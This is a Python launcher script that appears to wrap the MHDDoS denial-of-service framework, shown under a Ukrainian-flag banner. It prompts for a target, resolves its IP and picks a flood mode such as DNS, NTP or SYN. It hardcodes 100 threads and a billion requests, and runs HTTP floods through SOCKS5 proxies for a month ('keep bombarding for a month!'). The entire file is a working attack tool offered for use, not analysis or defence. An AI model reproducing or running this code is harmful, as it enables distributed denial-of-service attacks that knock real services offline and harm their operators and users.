import sys
from sys import argv

from humanfriendly.terminal import ansi_wrap

from MHDDoS.start import start, ToolsConsole
from utils import print_vpn_warning, supports_color


def print_flair():
    BLUE = (0, 91, 187)
    YELLOW = (255, 213, 0)
    GREEN = (8, 255, 8)
    RED = (255, 0, 0)

    heart = ansi_wrap("♥", color=(RED if supports_color() else None))
    flair_string = "\n" + \
                   "A light freedom-infused MHDDoS wrapper...\n" + \
                   "\n" + \
                   ansi_wrap("██████╗░██╗░░░██╗██████╗░██╗███████╗██╗░░██╗░█████╗░██╗░░██╗\n", color=(BLUE if supports_color() else None)) + \
                   ansi_wrap("██╔══██╗╚██╗░██╔╝██╔══██╗██║╚════██║██║░░██║██╔══██╗██║░██╔╝\n", color=(BLUE if supports_color() else None)) + \
                   ansi_wrap("██████╔╝░╚████╔╝░██████╔╝██║░░███╔═╝███████║██║░░██║█████═╝░\n", color=(BLUE if supports_color() else None)) + \
                   ansi_wrap("██╔═══╝░░░╚██╔╝░░██╔══██╗██║██╔══╝░░██╔══██║██║░░██║██╔═██╗░\n", color=(YELLOW if supports_color() else None)) + \
                   ansi_wrap("██║░░░░░░░░██║░░░██║░░██║██║███████╗██║░░██║╚█████╔╝██║░╚██╗\n", color=(YELLOW if supports_color() else None)) + \
                   ansi_wrap("╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\n", color=(YELLOW if supports_color() else None)) + \
                   "\n" + \
                   f"                                 ...from Ukraine with love {heart}\n"
    print(flair_string)
    print(ansi_wrap("Initializing...\n", color=(GREEN if supports_color() else None)))


def kara():
    print_flair()
    print_vpn_warning()

    # Init variables
    address = None
    port = None
    protocol = None

    # Parse target address
    if len(argv) < 2:
        address = input("Enter target address: ")
        if not address:
            print("Target not specified, aborting execution.")
            sys.exit(1)
        argv.insert(1, address)
    address = argv[1]

    # Parse port
    default_protocol = None
    if len(argv) > 2:
        port = argv[2]
        if port == "53" or port == "5353":
            default_protocol = "DNS"
            print(f"Port provided ({port}). It's a DNS port. Defaulting to DNS mode...")
        elif port == "123":
            default_protocol = "NTP"
            print(f"Port provided ({port}). It's an NTP port. Defaulting to NTP mode...")
        else:
            default_protocol = "UDP"
            print(f"Port provided ({port}). Using UDP mode...")

        # If we have a port, we need to get an IP of the target
        dns_info = ToolsConsole.info(address)
        if not dns_info["success"]:
            print(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
            sys.exit(1)

        address = dns_info['ip']

    # Parse protocol
    protocol = default_protocol
    if len(argv) > 3:
        protocol = argv[3]
        available_protocols = ["TCP", "UDP", "SYN", "VSE", "MEM", "NTP", "MINECRAFT", "DNS", "CHAR", "ARD", "RDP"]
        if protocol in available_protocols:
            print(f"Overriding attack protocol to '{protocol}'.")
        else:
            protocol = default_protocol
            print(f"Invalid attack protocol provided: {protocol}. Will use the protocol selected by default ({default_protocol}').\n"
                  f"If you want to override it, restart with one of the valid options: {','.join(available_protocols)}\n")

    hardcoded_n_threads = 100
    hardcoded_n_requests = 1000000000

    if not port or port == 80 or port == 443:
        # Prepare URL attack arguments
        argv[1] = "GET"
        argv.insert(2, address)
        argv.insert(3, "5")
        argv.insert(4, f"{hardcoded_n_threads}")
        argv.insert(5, "socks5.txt")
        argv.insert(6, f"{hardcoded_n_requests}")
        argv.insert(7, "44640")  # keep bombarding for a month!
    else:
        # Prepare IP attack arguments
        argv[1] = f"{protocol if protocol else default_protocol}"
        argv.insert(2, f"{address}:{port}")
        argv.insert(3, f"{hardcoded_n_threads}")
        argv.insert(4, f"{hardcoded_n_requests}")

    print()
    print(f"Initiating attack with the following MHDDoS parameters:\n     {' '.join(argv[1:])}")
    print()

    start()


if __name__ == '__main__':
    try:
        kara()
    except KeyboardInterrupt:
        print("\nExecution aborted.\n")
    except SystemExit:
        pass

    input("\nExecution finished.\nPress ENTER to exit... ")
